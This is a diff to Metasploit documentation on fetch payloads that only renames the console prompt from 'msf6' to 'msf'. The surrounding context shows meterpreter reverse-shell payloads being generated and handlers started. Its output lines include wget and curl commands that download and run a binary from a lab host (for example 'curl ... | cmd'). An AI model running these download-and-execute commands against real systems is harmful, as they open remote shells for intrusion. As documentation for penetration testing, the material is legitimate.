@@ -43,8 +43,8 @@ The fastest way to understand Fetch Payloads is to use them and examine the outp
 target with the ability to connect back to us with  an HTTP connection and a command execution vulnerability.
 First, let's look at the payload in isolation:
 ```msf
-msf6 exploit(multi/ssh/sshexec) > use payload/cmd/linux/http/x64/meterpreter/reverse_tcp
-msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > show options
+msf exploit(multi/ssh/sshexec) > use payload/cmd/linux/http/x64/meterpreter/reverse_tcp
+msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > show options
 
 Module options (payload/cmd/linux/http/x64/meterpreter/reverse_tcp):
 
@@ -62,7 +62,7 @@ LPORT               4444             yes       The listen port
 
 View the full module info with the info, or info -d command.
 
-msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > 
+msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > 
 ```
 
 ### Options
@@ -106,19 +106,19 @@ payload, we would see different options.
 
 ### Generating the Fetch Payload
 ```msf
-msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > set FETCH_COMMAND WGET
+msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > set FETCH_COMMAND WGET
 FETCH_COMMAND => WGET
-msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > set FETCH_SRVHOST 10.5.135.201
+msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > set FETCH_SRVHOST 10.5.135.201
 FETCH_SRVHOST => 10.5.135.201
-msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > set FETCH_SRVPORT 8000
+msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > set FETCH_SRVPORT 8000
 FETCH_SRVPORT => 8000
-msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > set LHOST 10.5.135.201
+msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > set LHOST 10.5.135.201
 LHOST => 10.5.135.201
-msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > set LPORT 4567
+msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > set LPORT 4567
 LPORT => 4567
-msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > generate -f raw
+msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > generate -f raw
 wget -qO ./YXeSdwsoEfOH http://10.5.135.201:8000/3cP1jDrJ3uWM1WrsRx3HTw; chmod +x ./YXeSdwsoEfOH; ./YXeSdwsoEfOH &
-msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > 
+msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > 
 ```
 
 You can see the fetch payload generated:
@@ -130,7 +130,7 @@ When you start the `Fetch Handler`, it starts both the server hosting the binary
 served payload.  With `verbose` set to `true`, you can see both the Fetch Handler and the Served Payload Handler are
 started:
 ```msf
-msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > to_handler
+msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > to_handler
 [*] wget -qO ./YBybOrAmkV http://10.5.135.201:8000/3cP1jDrJ3uWM1WrsRx3HTw; chmod +x ./YBybOrAmkV; ./YBybOrAmkV &
 [*] Payload Handler Started as Job 0
 [*] Fetch Handler listening on 10.5.135.201:8000
@@ -142,7 +142,7 @@ msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > to_handler
 The Fetch Handler is tracked with the Served Payload Handler, so you will only see the Served Payload Handler under
 `Jobs`, even though the Fetch Handler is listening:
 ```msf
-msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > jobs -l
+msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > jobs -l
 
 Jobs
 ====
@@ -151,7 +151,7 @@ Jobs
   --  ----                    -------                                     ------------
   0   Exploit: multi/handler  cmd/linux/http/x64/meterpreter/reverse_tcp  tcp://10.5.135.201:4567
 
-msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > netstat -ant | grep 8000
+msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > netstat -ant | grep 8000
 [*] exec: netstat -ant | grep 8000
 
 tcp        0      0 10.5.135.201:8000       0.0.0.0:*               LISTEN     
@@ -159,13 +159,13 @@ tcp        0      0 10.5.135.201:8000       0.0.0.0:*               LISTEN
 ```
 Killing the Served Payload handler will kill the Fetch Handler as well:
 ```msf
-msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > jobs -k 0
+msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > jobs -k 0
 [*] Stopping the following job(s): 0
 [*] Stopping job 0
-msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > netstat -ant | grep 8000
+msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > netstat -ant | grep 8000
 [*] exec: netstat -ant | grep 8000
 
-msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > 
+msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > 
 ```
 
 ## Using Fetch Payloads on the Fly
@@ -183,7 +183,7 @@ The following example shows both the original command to download and execute th
 original fetch command directly to the shell.  Since this requires two downloads, it is less stealthy, but the
 command to run on the target is significantly shorter.
 ``` msf
-msf6 payload(cmd/windows/http/x64/meterpreter_reverse_tcp) > to_handler
+msf payload(cmd/windows/http/x64/meterpreter_reverse_tcp) > to_handler
 [*] Command served: curl -so %TEMP%\DpRdBIfeyax.exe http://10.5.135.117:8080/zw3LGTh9FtaLJ4bCQRAWdw & start /B %TEMP%\DpRdBIfeyax.exe
 
 [*] Command to run on remote host: curl -s http://10.5.135.117:8080/test|cmd
@@ -290,7 +290,7 @@ Then, you can set `FetchListenerBindPort` to 3069 and get the callback correctly
 4) Because tftp is a udp-based protocol and because od the implementation of the server within Framework, each time you
 start a tftp fetch handler, a new service will start:
 ```msf
-msf6 payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > jobs
+msf payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > jobs
 
 Jobs
 ====
@@ -299,16 +299,16 @@ Jobs
   --  ----                    -------                                       ------------
   2   Exploit: multi/handler  cmd/windows/tftp/x64/meterpreter/reverse_tcp  tcp://10.5.135.201:4444
 
-msf6 payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > set LPORT 4445
+msf payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > set LPORT 4445
 LPORT => 4445
-msf6 payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > to_handler
+msf payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > to_handler
 
 [*] Command to run on remote host: curl -so plEYxIdBQna.exe tftp://10.5.135.201:8080/test1 & start /B plEYxIdBQna.exe
 [*] Payload Handler Started as Job 4
 
 [*] starting tftpserver on 10.5.135.201:8080
 [*] Started reverse TCP handler on 10.5.135.201:4445 
-msf6 payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > jobs
+msf payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > jobs
 
 Jobs
 ====
@@ -318,23 +318,23 @@ Jobs
   2   Exploit: multi/handler  cmd/windows/tftp/x64/meterpreter/reverse_tcp  tcp://10.5.135.201:4444
   4   Exploit: multi/handler  cmd/windows/tftp/x64/meterpreter/reverse_tcp  tcp://10.5.135.201:4445
 
-msf6 payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > netstat -an | grep 8080
+msf payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > netstat -an | grep 8080
 [*] exec: netstat -an | grep 8080
 
 udp        0      0 10.5.135.201:8080       0.0.0.0:*                          
 udp        0      0 10.5.135.201:8080       0.0.0.0:*                          
-msf6 payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > set FETCH_URIPATH test4
+msf payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > set FETCH_URIPATH test4
 FETCH_URIPATH => test4
-msf6 payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > set LPORT 8547
+msf payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > set LPORT 8547
 LPORT => 8547
-msf6 payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > to_handler
+msf payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > to_handler
 
 [*] Command to run on remote host: curl -so DOjmRoCOSMn.exe tftp://10.5.135.201:8080/test4 & start /B DOjmRoCOSMn.exe
 [*] Payload Handler Started as Job 5
 
 [*] starting tftpserver on 10.5.135.201:8080
 [*] Started reverse TCP handler on 10.5.135.201:8547 
-msf6 payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > netstat -an | grep 8080
+msf payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) > netstat -an | grep 8080
 [*] exec: netstat -an | grep 8080
 
 udp        0      0 10.5.135.201:8080       0.0.0.0:*                          
